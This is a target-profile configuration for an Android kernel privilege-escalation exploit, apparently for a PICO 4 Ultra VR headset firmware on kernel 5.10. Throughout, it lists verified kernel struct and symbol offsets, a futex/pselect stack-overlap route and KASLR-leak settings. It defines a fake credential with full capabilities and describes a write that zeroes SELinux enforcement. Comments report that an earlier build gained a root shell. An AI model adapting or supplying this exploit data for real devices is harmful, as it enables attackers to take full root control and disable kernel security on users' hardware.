# PICO 4 Ultra (sparrow), Android 14, firmware 5.15.7-202608080434-RELEASE-user-sparrow-b9105-b83b7763a9.
#
# Status: derived from this firmware's full OTA (kernel 5.10.198-perf-g49587cd7a509-ab115).
# Its IKCONFIG is byte-identical to the 5.14.4 build, so task_struct / cred /
# rt_mutex_waiter geometry carries over; every field below was re-verified against
# this image's disassembly (tools: verify_profile.py). Symbol offsets were re-derived
# from the image's own kallsyms. Device gate for this build: pending.
#
# Derivation anchors (all confirmed on this image by verify_profile.py):
#   init_task content          -> real_cred/cred/comm/prio/sched_task_group/tasks
#   commit_creds               -> real_cred 0x878, cred 0x880
#   __set_task_comm            -> comm 0x890 (memcpy 16)
#   task_blocks_on_rt_mutex    -> pi_lock 0x96c, pi_blocked_on 0x998,
#                                 waiter.task/lock 0x30/0x38, waiter.prio 0x40
#   rt_mutex_adjust_prio_chain / rt_mutex_setprio -> pi_waiters 0x980 / pi_top_task 0x990
#   sched_move_task            -> sched_task_group 0x3d0
#   __secure_computing         -> seccomp 0x948
#   copy_process               -> pid 0x6c8, tgid 0x6cc, tasks 0x5c8
#   prctl PR_SET_NO_NEW_PRIVS  -> atomic_flags 0x690
#   cred_init / mm_init        -> sizeof(cred)=0xa8, sizeof(mm_struct)=0x3c8 (1K slab)
#
# Route: select_stack. pselect fd_set window depth 0x210 vs futex waiter depth 0x208
# -> kernel shift 1 -> profile waiter_shift -1 (same as the 5.14.4 build, which
# passed on-device: calls=1 success=1, child uid=0).
release = "5.10.198-perf-g49587cd7a509-ab115"
schema_version = 1
kernel_major = 5
# Advisory only. The 5.x multicast family is split on this hint; keep 0 so W3
# (seccomp) is exercised on the normal path.
recommend_shizuku = 0
# 0xa8000000 from the uefi memory map (== native P0_KERNEL_PHYS_LOAD default).
kernel_phys_load = 2818572288
# 0x80000000 DRAM base (== P0_PHYS_OFFSET); VA_BITS=39 => PAGE_OFFSET
# 0xffffff8000000000, so direct-map aliases resolve inside target.h bounds.
kernel_phys_offset = 2147483648

# Route: select_stack (pselect fd_set window).
#
# Derivation from this image (PICO4-ULITA-NOTES.md section 6):
#   pselect chain  __arm64_sys_pselect6 0xa0 -> core_sys_select 0x1c0
#                  stack_fds (fd_set copy) at sp+0x50  => depth 0x210
#                  nfds=320 -> FDS_BYTES=0x28 < SELECT_STACK_ALLOC/6 (0x2b) => stack path
#   futex chain    __arm64_sys_futex 0x90 -> do_futex 0x70 -> futex_wait_requeue_pi 0x1a0
#                  rt_mutex_waiter at sp+0x98         => depth 0x208
#   delta = 0x210 - 0x208 = 8 -> shift = 1 -> profile value = shift - 2 = -1
#
# The compact word table lands as: tree_pc->waiter+0x00, pi_pc->+0x18,
# task->+0x30, lock->+0x38, prio->+0x40, deadline->+0x48, i.e. exactly the
# 5.10 struct rt_mutex_waiter prefix, so no native change is required.
route {
  select_stack {
    waiter_shift = -1
    compact_waiter = 1
  }
}
fallback {
  to = "none"
}

kernelsnitch {
  collisions = 8
  mm_struct_sz = 1024
}

task_struct {
  prio = 132
  normal_prio = 140
  sched_task_group = 976
  pi_lock = 2412
  pi_waiters = 2432
  pi_top_task = 2448
  pi_blocked_on = 2456
  pid = 1736
  tgid = 1740
  atomic_flags = 1680
  real_cred = 2168
  cred = 2176
  comm = 2192
  tasks = 1480
  seccomp = 2376
}

cred {
  # sizeof(struct cred) = 0xa8 (cred_init: kmem_cache_create("cred_jar", 0xa8))
  copy_size = 168
  # usage at +0x0; 256 keeps the fake cred from being freed
  usage_value = 256
  # cap_permitted/effective/bset at 0x30/0x38/0x40 (init_cred shows three
  # consecutive 0x1ffffffffff words); cap_ambient (0x48) stays 0.
  caps_offset = 48
  caps_count = 3
  caps_value = 2199023255551
  # user (0x80) / user_ns (0x88) / group_info (0x90), 5.10 has no ucounts.
  # Images are spelled like the built-in 5.x profiles: full pre-KASLR VAs.
  ref_count = 3
  ref0_offset = 128
  ref1_offset = 136
  ref2_offset = 144
  ref0_image = -274707151248
  ref1_image = -274707151840
  ref2_image = -274707146424
}

offset {
  # _text = 0xffffffc008000000; every value is an offset from it.
  init_task = 36477120
  init_cred = 36542624
  empty_zero_page = 38338560
  root_task_group = 38362176
  # selinux_state base == &selinux_state.enforcing (SELINUX_DISABLE=n, W1
  # writes a single zero byte there).
  selinux_enforcing = 38689472
  selinux_blob_sizes = 32594064
  security_hook_heads = 32592384
  slide_nfulnl_logger = 36433584
  slide_loggers_0_1 = 36433384
  slide_boot_id = 38820309
}
